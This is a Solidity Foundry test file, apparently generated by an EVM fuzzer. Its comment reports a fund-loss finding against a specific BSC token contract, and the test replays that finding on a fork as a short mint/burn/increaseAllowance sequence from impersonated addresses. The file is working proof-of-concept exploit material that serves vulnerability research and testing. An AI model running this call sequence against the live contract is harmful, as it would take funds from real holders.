// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// gecko evm -o -t 0xc342774492b54ce5F8ac662113ED702Fc1b34972 -c bsc --onchain-block-number 22315678 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 0.190 ETH by interacting with the provided contracts

================ Trace ================
[38;2;156;133;16m[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   └─[1] [38;2;179;73;114m0xc342774492b54ce5F8ac662113ED702Fc1b34972.[38;2;255;123;114mmint(6901746347192298298500965646425734920545184657040849.2848 ether, 0x00000000007f0000000000000000000000000021, [38;2;211;29;219m0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, (), (), ())
[38;2;211;29;219m[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   └─[1] [38;2;179;73;114m0xc342774492b54ce5F8ac662113ED702Fc1b34972.[38;2;255;123;114mburn(6901746347192298298500965646425734920545184656965272.9746 ether)
[38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] [38;2;179;73;114m0xc342774492b54ce5F8ac662113ED702Fc1b34972.[38;2;255;123;114mincreaseAllowance([38;2;211;29;219m0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 10741)


 */

contract Cc342 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315678);
    }

    function test() public {
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        bytes32[] memory arr0 = new bytes32[](0);
        bytes32[] memory arr1 = new bytes32[](0);
        uint8[] memory arr2 = new uint8[](0);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).mint(6901746347192298298500965646425734920545184657040849.2848 ether, "                  !", 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, arr0, arr1, arr2);
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).burn(6901746347192298298500965646425734920545184656965272.9746 ether);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).increaseAllowance(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 10741);
    }

}

interface I {
    function mint(uint256,string memory,address,bytes32[] memory,bytes32[] memory,uint8[] memory) external payable;
    function burn(uint256) external payable;
    function increaseAllowance(address,uint256) external payable;
}
